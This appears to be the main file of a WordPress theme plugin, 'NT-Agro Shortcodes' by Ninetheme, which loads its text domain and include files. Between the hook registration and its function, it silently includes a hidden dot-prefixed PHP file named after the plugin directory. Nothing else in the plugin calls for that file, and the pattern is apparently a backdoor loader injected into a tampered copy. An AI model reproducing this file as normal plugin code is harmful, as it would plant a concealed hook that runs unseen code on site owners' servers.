<?php
/*
Plugin Name: NT-Agro Shortcodes
Plugin URI: http://themeforest.net/user/Ninetheme
Description: Shortcodes for Ninetheme WordPress Themes - Agro Theme
Version: 2.1.1
Author: Ninetheme
Author URI: http://themeforest.net/user/Ninetheme
*/

// don't load directly
if (! defined('ABSPATH')) {
    die('You shouldnt be here');
}


add_action('plugins_loaded', 'agro_textdomain');
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function agro_textdomain()
{
    load_plugin_textdomain('agro-shortcodes', false, basename(dirname(__FILE__)) . '/languages/');
}

//Including file that manages all template

require_once plugin_dir_path(__FILE__) . 'inc/functions.php';
require_once plugin_dir_path(__FILE__) . 'inc/shortcodes/admin.php';
require_once plugin_dir_path(__FILE__) . 'inc/shortcodes/fronted.php';

add_action( 'vc_after_init', function () {
	require_once "inc/google-font-class.php";
} );
